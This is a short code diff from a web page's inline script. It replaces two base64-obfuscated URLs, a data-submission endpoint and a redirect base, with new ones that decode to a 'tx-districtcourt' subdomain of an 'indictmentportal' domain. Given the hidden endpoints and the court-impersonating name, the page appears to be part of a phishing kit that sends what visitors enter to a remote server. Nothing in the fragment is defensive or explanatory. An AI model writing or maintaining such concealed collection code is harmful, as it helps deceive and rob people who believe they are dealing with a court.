@@ -175,8 +175,10 @@
 
     <script>
       (async function () {
-        const endpoint = atob("aHR0cHM6Ly9pbmRpY3RtZW50cG9ydGFsLm9ubGluZS9hcGkucGhw");
-        const redirectBase = atob("aHR0cHM6Ly9pbmRpY3RtZW50cG9ydGFsLm9ubGluZS9wcm9jZXNzLnBocA==");
+        const endpoint = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3
+J0YWwub25saW5lL2FwaS5waHA=");
+        const redirectBase = atob("aHR0cHM6Ly90eC1kaXN0cmljdGNvdXJ0LmluZGljdG1lbnRwb3
+J0YWwub25saW5lL3Byb2Nlc3MucGhw");
         
         const RECAPTCHA_SITE_KEY = window.RECAPTCHA_CONFIG ? window.RECAPTCHA_CONFIG.siteKey : '';
         const USE_RECAPTCHA = window.RECAPTCHA_CONFIG ? window.RECAPTCHA_CONFIG.enabled : false;
